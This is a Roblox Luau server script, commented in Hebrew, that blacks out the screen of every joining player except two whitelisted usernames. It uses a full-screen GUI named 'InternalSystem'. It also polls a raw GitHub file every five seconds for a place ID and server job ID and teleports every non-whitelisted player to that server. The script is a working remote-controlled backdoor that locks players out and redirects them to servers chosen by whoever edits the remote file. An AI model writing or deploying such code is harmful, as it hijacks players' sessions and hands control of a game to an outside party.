local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- הקישור ה-Raw המעודכן שלך
local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"

-- רשימת חסימה (הם לא יקבלו מסך שחור ולא ישתגרו)
local blockedPlayers = {
	["noamdb15"] = true,
	["dylanzyl123"] = true
}

-- פונקציה ליצירת מסך שחור אצל השחקן
local function createBlackScreen(player)
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "InternalSystem"
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 999999
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local blackFrame = Instance.new("Frame")
	blackFrame.Size = UDim2.new(1, 0, 1, 0)
	blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
	blackFrame.Active = true
	blackFrame.BorderSizePixel = 0
	blackFrame.Parent = screenGui
end

-- כששחקן נכנס למשחק
Players.PlayerAdded:Connect(function(player)
	if blockedPlayers[player.Name] then
		print(player.Name .. " is whitelisted. No lock applied.")
		return
	end

	-- נותן לו מסך שחור
	createBlackScreen(player)
	print("Lock applied to: " .. player.Name)
end)

-- לופ בדיקת ה-GitHub מהשרת
task.spawn(function()
	while task.wait(5) do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. os.time())
		end)

		if success and response then
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do
				table.insert(lines, line)
			end

			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			if targetJobId and targetJobId ~= "" then
				-- עובר על כל השחקנים בשרת ומשגר את מי שלא חסום
				for _, player in pairs(Players:GetPlayers()) do
					if not blockedPlayers[player.Name] then
						pcall(function()
							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
						end)
					end
				end
			end
		end
	end
end)
